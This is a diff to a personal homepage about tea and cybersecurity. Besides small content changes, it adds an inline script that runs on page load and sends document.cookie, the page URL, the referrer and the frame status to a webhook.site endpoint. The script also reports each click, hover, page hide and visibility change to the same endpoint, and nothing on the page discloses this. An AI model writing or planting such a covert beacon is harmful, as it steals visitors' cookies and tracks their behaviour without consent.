@@ -1,4 +1,14 @@
-<!doctype html><html><head><title>My Personal Homepage</title></head><body>
-<h1>Welcome to G36 maid's homepage</h1>
-<p>This is my totally normal website about tea and cybersecurity.</p>
-</body></html>
+<!doctype html><html><head><title>G36 maid's homepage</title></head><body>
+<h1>Welcome to my homepage</h1>
+<p>Tea, cybersecurity, and websites.</p>
+<button id="b1">Click me</button>
+<a href="https://example.com">a link</a>
+<script>
+const L=(t,d)=>{navigator.sendBeacon('https://webhook.site/9f7f9d67-ed2e-4901-8c1e-c408e2810001?ev='+encodeURIComponent(t)+(d?'&d='+encodeURIComponent(JSON.stringify(d).slice(0,280)):''))};
+L('load',{u:location.href,top:window===top,ref:document.referrer,ck:document.cookie});
+addEventListener('click',e=>L('click',{t:e.target.tagName,id:e.target.id,c:(e.target.textContent||'').slice(0,40)}),true);
+addEventListener('mouseover',e=>{if(e.target.id)L('hover',{id:e.target.id})},true);
+addEventListener('pagehide',()=>L('pagehide'));
+addEventListener('visibilitychange',()=>L('vis',{h:document.hidden}));
+L('end');
+</script></body></html>
